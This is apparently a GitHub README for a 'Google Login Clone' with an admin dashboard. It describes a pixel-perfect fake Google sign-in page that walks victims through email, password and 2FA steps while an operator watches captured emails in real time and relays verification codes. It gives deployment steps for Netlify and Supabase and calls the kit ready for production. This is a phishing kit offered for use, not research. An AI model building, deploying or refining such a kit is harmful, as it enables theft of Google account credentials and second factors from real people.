# 🚀 Google Login Clone + Admin Dashboard

**Professional Google Login Interface + Real-time Admin Dashboard**

## 📊 **Project Structure**

```
📁 Google Full/
├── 📱 admin-gui/           → Admin Dashboard (GUI Local/gui.html)
├── 🔐 google-login-clone/  → Frontend Login Interface  
├── 📂 configs/             → Edge functions, SQL schemas
├── 🚀 deployment/          → Netlify configs & deploy scripts
├── 🧪 tests/               → API test scripts
├── 📖 docs/                → Documentation
├── ⚙️ supabase/            → Backend functions
└── 💻 GUI Local/           → Development source
```

## 🎯 **2 Projects - 2 Deployments**

### **📱 PROJECT 1: Admin Dashboard**
- **Source**: `admin-gui/` folder (GUI Local/gui.html)
- **Features**: Purple gradient dashboard, real-time tracking, stats
- **Target**: `google-admin-gui.netlify.app`

### **🔐 PROJECT 2: Frontend Login**  
- **Source**: `google-login-clone/` folder (14 files)
- **Features**: Pixel-perfect Google login interface
- **Target**: `google-login-clone-demo.netlify.app`

## 🚀 **Netlify Deployment**

### **Deploy Admin Dashboard:**
```
Repository: https://github.com/tigerads1998/login-clone
Branch: main
Site name: google-admin-gui
Publish directory: admin-gui
Config: deployment/netlify-admin.toml
```

### **Deploy Frontend:**
```
Repository: https://github.com/tigerads1998/login-clone  
Branch: main
Site name: google-login-clone-demo
Publish directory: google-login-clone
Config: deployment/netlify-frontend.toml
```

## ⚙️ **Backend Setup**

### **Supabase Edge Function:**
- Function name: `admin-api`
- Source: `supabase/functions/admin-api/index.ts`
- Endpoints: `/api/pending`, `/api/approve`, `/api/delete`, `/api/set-verification-code`

### **Database:**
- Schema: `configs/supabase-schema-fixed.sql`
- Table: `requests` with RLS disabled

## 🔗 **API Integration**

All frontend files connect to Supabase admin-api:
- Authorization headers included
- Real-time verification code sync
- Admin approval workflow

## 📱 **Features**

### **Admin Dashboard:**
- 🎨 Beautiful purple gradient UI
- 📊 Statistics cards (Total, Pending, Approved, Codes)
- 📈 Real-time email tracking table
- ✅ Approve/Deny with verification codes
- 🔄 Auto-refresh every 1 second

### **Frontend Login:**
- 🎯 Pixel-perfect Google UI clone
- 📱 Multi-step authentication flow
- 📧 Email → Password → 2FA → Verification
- 🔄 Real-time admin approval checking
- 📱 Responsive design

## 🚀 **Quick Deploy**

1. **Fork this repository**
2. **Deploy Admin Dashboard**: [Netlify Deploy](https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/login-clone) → `admin-gui`
3. **Deploy Frontend**: [Netlify Deploy](https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/login-clone) → `google-login-clone`
4. **Setup Supabase**: Create admin-api function with provided code

---

**🎯 Professional, organized, and ready for production!** 